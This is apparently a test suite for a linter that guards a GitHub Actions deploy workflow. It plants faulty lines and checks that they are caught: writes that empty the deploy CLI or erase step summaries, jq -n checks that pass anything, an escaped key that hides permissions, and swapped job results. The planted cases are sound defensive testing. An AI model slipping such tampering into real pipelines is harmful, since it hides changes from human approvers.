        `${GUARD}: DPW-10 PLAN_BASIS, line ${lineOf(planted, call)}: ${VERDICT}`,
      )
    }
    // bash keeps the escaped } inside the expansion and the argument } in the body, and : swallows the exit.
    expect(bash(`f() { : \${x:-\\}}; exit 1; }; : "$(f)"; echo went on`).stdout.trim()).toBe('went on')
    expect(bash('f() { : }; exit 1; }; : "$(f)"; echo went on').stdout.trim()).toBe('went on')
    expect(canonicalTextFindings()).toEqual([])
  })

  // A > glued to && is a write of its own: [ -n "$step" ] &&>"$f" emptied prod-plan's CLI before its diff, which then
  // ran an empty file with status 0 and showed the approver nothing. Planted in prod's What runs, which writes no
  // diff, so the write found is the plant's (a change to a diff run here, away from DIFF_RUNS, makes its own
  // writes to "$DIFF" findings).
  it('reads a write after && as a write (DPW-10)', () => {
    for (const write of ['&&>', '&&>>', '&&>|']) {
      const line = `          [ -n "$STAGE" ] ${write}"$RUNNER_TEMP/aws-cdk/package/bin/cdk"\n`
      expect(
        credentialedCodeFindings(
          addedBefore('prod', 'What runs', '          plan_basis check\n', line),
          manifests,
          lockfile,
        ),
        write,
      ).toContain(`${DEPLOY}: DPW-10 prod (What runs): ${WRITES}`)
    }
    const folder = mkdtempSync(join(tmpdir(), 'hearth-andand-'))
    try {
      writeFileSync(join(folder, 'cli'), 'x\n')
      expect(bash(`[ -n x ] &&>"${join(folder, 'cli')}"; wc -c <"${join(folder, 'cli')}"`).stdout.trim()).toBe('0')
    } finally {
      rmSync(folder, { recursive: true, force: true })
    }
    expect(credentialedCodeFindings(workflows, manifests, lockfile)).toEqual([])
  })

  // prod-plan's diff runs were exempt from standing alone on their exit "$STATUS", which no rule read: with that
  // line dropped, or ending exit "$DOWN_STATUS", a failed diff ended prod-plan green and prod waited for approval.
  it('holds each diff run to ending with exit "$STATUS" after its wrapped diffs, so a failed diff fails prod-plan (DPW-06)', () => {
    const end = '\nexit "$STATUS"'
    expect(DIFF_RUN.endsWith(end) && ROLLBACK_DIFF_RUN.endsWith(end)).toBe(true)
    expect(diffFormHolds(DIFF_RUN) && diffFormHolds(ROLLBACK_DIFF_RUN)).toBe(true)
    for (const [what, text] of [
      ['no exit', DIFF_RUN.slice(0, -end.length)],
      ['exit "$DOWN_STATUS"', `${DIFF_RUN.slice(0, -end.length)}\nexit "$DOWN_STATUS"`],
      ["the rollback's diff with no exit", ROLLBACK_DIFF_RUN.slice(0, -end.length)],
      ['STATUS set again', DIFF_RUN.replace('\ncat "$DIFF"\n', '\nSTATUS=0\ncat "$DIFF"\n')],
      ['an exit 0 before the end', DIFF_RUN.replace('\ncat "$DIFF"\n', '\ncat "$DIFF"\nexit 0\n')],
      ['read sets STATUS', DIFF_RUN.replace('\ncat "$DIFF"\n', '\nread -r STATUS <<<0\ncat "$DIFF"\n')],
      ['a diff not wrapped', ROLLBACK_DIFF_RUN.replace('} >"$DIFF" || STATUS=$?', '} >"$DIFF" || true')],
      ["the down diff's status dropped", DIFF_RUN.replace('      DOWN_STATUS=$?\n', '      DOWN_STATUS=0\n')],
      ['the exit in an and-or list', `${DIFF_RUN.slice(0, -end.length)}\n[ -n "$STAGE" ] &&\nexit "$STATUS"`],
    ] as const) {
      expect(text === DIFF_RUN || text === ROLLBACK_DIFF_RUN, what).toBe(false)
      expect(diffFormHolds(text), what).toBe(false)
    }
    const form = `${DEPLOY}: DPW-06 prod-plan: ${DIFF_FORM}`
    for (const [what, planted] of [
      [
        'Diff ending exit "$DOWN_STATUS"',
        inStep('prod-plan', 'Diff', '          exit "$STATUS"\n', '          exit "$DOWN_STATUS"\n'),
      ],
      ['Diff the rollback with no exit', inStep('prod-plan', 'Diff the rollback', '          exit "$STATUS"\n', '')],
    ] as const) {
      expect(deployStepFindings(planted), what).toContain(form)
    }
    expect(deployStepFindings(workflows).filter(each => each.endsWith(DIFF_FORM))).toEqual([])
    // Each diff run as committed, with a stand-in CLI that prints part of a diff and fails, ends with the CLI's
    // status, for a deploy, a rollback and a restore up, and the rollback's diff; with exit "$DOWN_STATUS" it ended 0.
    const runWith = (run: string, env: Record<string, string>) => {
      const folder = mkdtempSync(join(tmpdir(), 'hearth-diff-exit-'))
      try {
        execFileSync('mkdir', ['-p', join(folder, 'aws-cdk/package/bin'), join(folder, 'bin')])
        writeFileSync(
          join(folder, 'aws-cdk/package/bin/cdk'),
          "#!/bin/bash\necho 'Stack prod/Platform'\necho 'There were no differences'\necho 'failed to read a template' >&2\nexit 3\n",
          { mode: 0o755 },
        )
        writeFileSync(join(folder, 'bin/aws'), "#!/bin/bash\necho 'Stack with id x does not exist' >&2\nexit 254\n", {
          mode: 0o755,
        })
        for (const file of ['summary', 'output']) writeFileSync(join(folder, file), '')
        const ran = spawnSync('bash', ['--noprofile', '--norc', '-eo', 'pipefail', '-c', run], {
          encoding: 'utf8',
          env: {
            PATH: `${join(folder, 'bin')}:${process.env.PATH ?? ''}`,
            HOME: folder,
            RUNNER_TEMP: folder,
            GITHUB_STEP_SUMMARY: join(folder, 'summary'),
            GITHUB_OUTPUT: join(folder, 'output'),
            ...env,
          },
        })
        return { status: ran.status, summary: readFileSync(join(folder, 'summary'), 'utf8') }
      } finally {
        rmSync(folder, { recursive: true, force: true })
      }
    }
    const deploy = { STAGE: 'prod', MODE: 'deploy', RESTORE: '' }
    for (const [what, run, env] of [
      ['a deploy', DIFF_RUN, deploy],
      ['a rollback', DIFF_RUN, { ...deploy, MODE: 'rollback' }],
      ['a restore up', DIFF_RUN, { STAGE: 'restore', MODE: 'restore', RESTORE: 'up' }],
      ["the rollback's diff", ROLLBACK_DIFF_RUN, deploy],
    ] as const) {
      const ran = runWith(run, env)
      expect(ran.status, what).toBe(3)
      expect(ran.summary, what).toContain('The diff failed (exit 3), so this plan fails')
    }
    expect(runWith(`${DIFF_RUN.slice(0, -end.length)}\nexit "$DOWN_STATUS"`, deploy).status).toBe(0)
  }, 120_000)

  // A jq given -n reads no input, so a check handed a file or a here-string with -n checked null and passed
  // whatever its data held.
  it('hands a jq given -n no data (DPW-10)', () => {
    for (const [text, lines] of [
      [`jq -ne '.a' "$dir/$file"`, [0]],
      [`jq -n -e '.a' <<<"$X"`, [0]],
      [`jq -e -n '.a' <<<"$X"`, [0]],
      [`jq -nr '.a' <"$f"`, [0]],
      [`x | jq -n '.'`, [0]],
      [`jq -nc --arg a "$b" '{a: $a}'`, []],
      [`jq -n --argjson x "$X" -e '$x | .a'`, []],
      [`jq -e '.a' <<<"$X"`, []],
      [`jq -se 'all(.[]; f)' "$dir/manifest.json"`, []],
    ] as const) {
      expect(jqUnreadLines(text), text).toEqual(lines)
    }
    const role = ASSET_CHECK.split('\n').find(line => line.trimStart().startsWith("jq -e '[.Resources // {}"))
    if (role === undefined) throw new Error('no role check')
    const planted = replaced(ASSET_CHECK, [role, role.replace("jq -e '", "jq -ne '")])
    expect(canonicalTextFindings({ ASSET_CHECK: planted })).toContain(
      `${GUARD}: DPW-10 ASSET_CHECK, line ${lineOf(planted, role.replace("jq -e '", "jq -ne '"))}: ${UNREAD}`,
    )
    // The read-back's ARN check in glue, as jq -n -e and jq -e -n, and the push's tag check.
    const arn = `if ! jq -e 'tostring | ascii_downcase | contains("arn:") | not' <<<"$READBACK" >/dev/null; then`
    for (const flags of ['-n -e', '-e -n']) {
      expect(
        credentialedCodeFindings(plant(arn, arn.replace('jq -e', `jq ${flags}`), job('nonprod')), manifests, lockfile),
        flags,
      ).toContain(`${DEPLOY}: DPW-10 nonprod (Read back what runs): ${HELD}`)
    }
    // jq: -n checks null whatever the here-string holds.
    const check = `jq %s 'tostring | ascii_downcase | contains("arn:") | not' <<<'"arn:aws:x"' >/dev/null`
    expect(bash(check.replace('%s', '-e')).status).toBe(1)
    expect(bash(check.replace('%s', '-n -e')).status).toBe(0)
    expect(canonicalTextFindings()).toEqual([])
    expect(credentialedCodeFindings(workflows, manifests, lockfile)).toEqual([])
  })

  // The gate's Plan step's summary written with >, which erased the lines naming the records history.ts ignored,
  // and the down diff's output written with >, which erased the step's earlier outputs.
  it('writes the job summary and outputs only by appending, in every job (DPW-07)', () => {
    const gateSummary = '} >>"$GITHUB_STEP_SUMMARY"\n'
    expect(maskingFindings(inStep('gate', 'Plan', gateSummary, gateSummary.replace('>>', '>')))).toContain(
      `${DEPLOY}: DPW-07 gate (Plan): ${APPENDS}`,
    )
    const down = 'echo "down=$DOWN_READ" >>"$GITHUB_OUTPUT"'
    expect(RESTORE_DOWN_DIFF).toContain(down)
    expect(maskingFindings(inStep('prod-plan', 'Diff', down, down.replace('>>', '>')))).toContain(
      `${DEPLOY}: DPW-07 prod-plan (Diff): ${APPENDS}`,
    )
    // Round 12's lenses: the summary's path held in a name of the run's own and written through it with >, or
    // a prepared file copied onto it, each erases what the step wrote there before as a > does, by no redirection
    // into either name.
    const plan = "          {\n            echo '### The plan'\n"
    expect(
      maskingFindings(
        withText(
          DEPLOY,
          edited(
            deployText,
            stepText(deployText, 'gate', 'Plan'),
            replaced(
              stepText(deployText, 'gate', 'Plan'),
              [plan, `          summary="$GITHUB_STEP_SUMMARY"\n${plan}`],
              [gateSummary, '} >"$summary"\n'],
            ),
            job('gate'),
          ),
        ),
      ),
    ).toContain(`${DEPLOY}: DPW-07 gate (Plan): ${APPENDS}`)
    expect(
      maskingFindings(
        inStep('gate', 'Plan', plan, `          cp "$RUNNER_TEMP/plan.md" "$GITHUB_STEP_SUMMARY"\n${plan}`),
      ),
    ).toContain(`${DEPLOY}: DPW-07 gate (Plan): ${APPENDS}`)
    for (const [text, holds] of [
      ['{\n  echo x\n} >"$GITHUB_STEP_SUMMARY"', false],
      ['echo a=b >"$GITHUB_OUTPUT"', false],
      ['echo a=b 1>"$GITHUB_OUTPUT"', false],
      ['echo a=b >|"$GITHUB_OUTPUT"', false],
      ['echo x | tee "$GITHUB_STEP_SUMMARY"', false],
      ['summary="$GITHUB_STEP_SUMMARY"\n{\n  echo x\n} >"$summary"', false],
      ['f=$GITHUB_OUTPUT; echo a=b >"$f"', false],
      ['cp "$RUNNER_TEMP/plan.md" "$GITHUB_STEP_SUMMARY"', false],
      ['mv "$RUNNER_TEMP/plan.md" "$GITHUB_STEP_SUMMARY"', false],
      ['dd if=x of="$GITHUB_OUTPUT"', false],
      ['truncate -s 0 "$GITHUB_STEP_SUMMARY"', false],
      ['sed -i d "$GITHUB_STEP_SUMMARY"', false],
      ['cp tee -a "$GITHUB_STEP_SUMMARY"', false],
      ['echo a=b >>"$GITHUB_OUTPUT"x', false],
      ['echo a=b >>"x$GITHUB_OUTPUT"', false],
      ['echo a=b >>"$' + '{GITHUB_OUTPUT%/*}/x"', false],
      ['echo x | tee -a "$GITHUB_STEP_SUMMARY"', true],
      ['tee -a "$GITHUB_STEP_SUMMARY" <"$RUNNER_TEMP/x" >&2', true],
      ['echo a=b >>"$GITHUB_OUTPUT"', true],
      ['echo a=b 2>>"$GITHUB_OUTPUT"; echo c=d &>>"$GITHUB_OUTPUT"', true],
      ['echo a=b >>$' + '{GITHUB_OUTPUT}', true],
      ['echo \'>"$GITHUB_OUTPUT"\'', true],
      ['# cp x "$GITHUB_OUTPUT"\necho a', true],
    ] as const) {
      expect(appendsOnly(text), text).toBe(holds)
    }
    expect(maskingFindings(workflows)).toEqual([])
  })

  // ci.yml's pins check written run: >-, which parsedSteps() read as its four lines while YAML folded them into one
  // printf, so check-action-pins.ts never ran and the job went green; and the CLI pin's run the same way.
  it('holds the two runs ci.yml’s held jobs run to a literal block scalar (DPW-04)', () => {
    const ciText = workflows.get(CI) ?? ''
    for (const [id, finding] of [
      ['action-pins', PINS_JOB_FINDING],
      ['cli-pin', CLI_PIN_JOB_FINDING],
    ] as const) {
      for (const header of ['>-', '>', '>+']) {
        expect(
          actionPinFindings(plant('        run: |\n', `        run: ${header}\n`, `\n  ${id}:\n`, CI)),
          `${id} ${header}`,
        ).toContain(`${CI}: DPW-04 ${finding}`)
      }
    }
    for (const id of ['action-pins', 'cli-pin']) {
      const held = workflowJobs(ciText).find(each => each.id === id)
      if (held === undefined) throw new Error(`no ${id} job`)
      const run = parsedSteps(held).at(-1)
      expect(run !== undefined && literalRun(run), id).toBe(true)
    }
    expect(actionPinFindings(workflows)).toEqual([])
  })

  // CLI_PIN_DRIFT reads a path git quotes: hash-object --stdin-paths unquotes a line that starts with a double
  // quote, so a file whose name git quotes is compared by its own bytes, and its drift refused.
  it('compares a file whose name git quotes by its own bytes (CLI_PIN_DRIFT)', () => {
    const folder = mkdtempSync(join(tmpdir(), 'hearth-quoted-'))
    try {
      const git = (...args: string[]) => execFileSync('git', args, { cwd: folder, encoding: 'utf8' })
      git('init', '-q', '-b', 'main')
      writeFileSync(join(folder, 'docs-café.md'), 'notes\n')
      writeFileSync(join(folder, 'quote"and\\back'), 'b\n')
      git('add', '-A')
      git('-c', 'user.name=t', '-c', 'user.email=t@example.invalid', '-c', 'commit.gpgsign=false', 'commit', '-qm', 'c')
      expect(git('ls-tree', '-r', 'HEAD')).toContain('"docs-caf\\303\\251.md"')
      const drift = () => spawnSync('bash', ['-e', '-c', CLI_PIN_DRIFT], { cwd: folder, encoding: 'utf8' })
      expect(drift().status).toBe(0)
      writeFileSync(join(folder, 'docs-café.md'), 'notes, rewritten\n')
      const refused = drift()
      expect(refused.status).toBe(1)
      expect(refused.stdout).toContain("cli-pin: the checkout isn't HEAD's blobs byte for byte")
    } finally {
      rmSync(folder, { recursive: true, force: true })
    }
  })

  // A record job's verdicts held through STEP_ENVS alone: SMOKE read from the deploy job's result, a one-token change
  // made with recordEnv's, recorded a release whose smoke failed as deployed and the job green.
  it('holds a record job’s SMOKE and RESMOKE to its smoke’s and resmoke’s results, as written (DPW-13)', () => {
    for (const stage of ['nonprod', 'prod']) {
      for (const [from, to] of [
        [`SMOKE: \${{ needs.smoke-${stage}.result }}`, `SMOKE: \${{ needs.${stage}.result }}`],
        [`RESMOKE: \${{ needs.resmoke-${stage}.result }}`, `RESMOKE: \${{ needs.rollback-${stage}.result }}`],
      ] as const) {
        expect(
          releaseFindings(plant(`          ${from}\n`, `          ${to}\n`, job(`record-${stage}`))),
          `${stage} ${to}`,
        ).toContain(`${DEPLOY}: DPW-13 record-${stage} (Write the record): ${JUDGED}`)
      }
    }
    expect(releaseFindings(workflows).filter(each => each.endsWith(JUDGED))).toEqual([])
  })
})

// Round 12's lenses: refusals no planted case reached, so a refactor could drop or narrow one with every case
// still green. Each is planted here as an author would write it and found, alone, by the rule that holds it.
describe('Round 12: the refusals no case reached (DPW-01, DPW-02, DPW-03, DPW-06, DPW-07, DPW-10)', () => {
  const restore =
    '      restore:\n        description: up or down for target restore; none otherwise\n        type: choice\n        options: [none, up, down]\n        default: none\n'
  const restoreDescription = '        description: up or down for target restore; none otherwise\n'
  const at = (rule: string, text: string) => `${DEPLOY}: ${rule} ${text}`

  it('holds the dispatch to exactly its four inputs, each with a description (DPW-01)', () => {
    const ON = [
      at('DPW-01', 'on: is a push to main and a dispatch with exactly the target, mode, release and restore inputs'),
    ]
    const on = (from: string, to: string) => triggerFindings(plant(from, to), rulesetText)
    expect(
      on(restore, `${restore}      ref:\n        description: A ref\n        type: string\n        default: ''\n`),
    ).toEqual(ON)
    expect(on(restoreDescription, "        description: ''\n")).toEqual(ON)
    expect(
      on('  workflow_dispatch:\n    inputs:\n', '  workflow_dispatch:\n    types: [requested]\n    inputs:\n'),
    ).toEqual(ON)
  })

  it('refuses a job of no name it knows and an escape in deploy.yml (DPW-02)', () => {
    const extra =
      '\n  extra:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    steps:\n      - name: x\n        run: echo x\n'
    expect(permissionFindings(plant(job('gate'), `${extra}  gate:\n`))).toEqual([
      at('DPW-02', 'extra: is none of the seventeen jobs'),
    ])
    expect(
      permissionFindings(
        plant(restoreDescription, '        description: "up or down for target restore\\x3B none otherwise"\n'),
      ),
    ).toEqual([at('DPW-02', 'spells no key or value with an escape, which could name id-token or write-all unseen')])
  })

  it('refuses an environment job without the credentials action (DPW-03)', () => {
    const action = '        uses: aws-actions/configure-aws-credentials@'
    expect(credentialJobFindings(plant(action, action.replace('credentials@', 'credential@'), job('nonprod')))).toEqual(
      [at('DPW-03', 'nonprod: takes its credentials through the credentials action')],
    )
  })

  it('sets STAGE only at the job that may set it (DPW-06)', () => {
    expect(
      deployStepFindings(
        plant('    cache-mode: none\n', '    cache-mode: none\n    env:\n      STAGE: nonprod\n', job('gate')),
      ),
    ).toEqual([at('DPW-06', 'gate: sets no STAGE')])
    expect(
      deployStepFindings(plant('        env:\n', '        env:\n          STAGE: nonprod\n', job('nonprod'))),
    ).toEqual([at('DPW-06', 'nonprod: sets STAGE once, at the job, to nonprod')])
  })

  it('sets no AWS_ variable in a credentialed step’s env: or on a run line (DPW-07)', () => {
    const AWS = [at('DPW-07', 'nonprod: sets no AWS_ variable and no ROLE_TO_ASSUME')]
    expect(
      maskingFindings(plant('        env:\n', '        env:\n          AWS_REGION: ap-southeast-1\n', job('nonprod'))),
    ).toEqual(AWS)
    const stop = '          echo "::stop-commands::$stop_token"\n'
    expect(maskingFindings(plant(stop, `${stop}          AWS_REGION=us-east-1\n`, job('nonprod')))).toEqual(AWS)
  })

  it('refuses a manifest npm can’t read and a jq --arg of no name (DPW-10)', () => {
    expect(
      credentialedCodeFindings(workflows, new Map([...manifests, ['apps/web/package.json', '{']]), lockfile),
    ).toEqual(['apps/web/package.json: DPW-10 is a package.json npm can read'])
    const jq = (line: string) => {
      const command = readShell(line).commands.find(each => each.name === 'jq')
      if (command === undefined) throw new Error(`no jq in ${line}`)
      return jqIsHeld(command.args, false, true)
    }
    expect(jq(`jq -r --arg x y '.' <<<"$A"`)).toBe(true)
    expect(jq(`jq -r --arg 1x y '.' <<<"$A"`)).toBe(false)
    expect(jq(`jq -r --arg 'x y' z '.' <<<"$A"`)).toBe(false)
  })
})
